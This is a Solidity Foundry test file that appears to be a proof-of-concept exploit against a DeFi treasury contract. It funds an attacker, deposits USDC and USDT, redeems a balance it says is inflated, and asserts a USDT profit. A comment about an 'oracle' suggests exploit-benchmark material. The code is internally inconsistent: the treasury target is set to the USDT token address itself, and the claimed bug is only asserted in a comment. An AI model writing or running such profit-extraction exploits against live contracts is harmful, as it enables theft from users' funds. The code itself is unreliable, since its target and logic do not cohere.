// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface ITreasury {
    function invest(address collateral, uint256 amount) external;
    function redeem(uint256 amount) external;
    function balanceOf(address owner) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address attacker = address(this);
    IERC20 constant usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    ITreasury treasury = ITreasury(TARGET);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        uint256 amount = 10_000e6;

        deal(address(usdt), attacker, amount);
        deal(address(usdc), attacker, amount);

        usdt.approve(TARGET, type(uint256).max);
        usdc.approve(TARGET, type(uint256).max);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(address(this));
        uint256 initialAttackerUSDTBalance = usdt.balanceOf(attacker);

        // Deposit 1000 USDC and 1000 USDT
        uint256 depositAmount = 1_000e6;
        treasury.invest(address(usdc), depositAmount);
        treasury.invest(address(usdt), depositAmount);

        // Due to the bug, the contract thinks we have deposited 2000 units of the primary asset.
        uint256 inflatedBalance = treasury.balanceOf(attacker);

        // Redeem the inflated balance in USDT
        treasury.redeem(inflatedBalance);

        // The oracle requires the attacker's balance of the specified token (USDT) to increase.
        assertGt(usdt.balanceOf(attacker), initialAttackerUSDTBalance);
        uint256 finalBalance = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

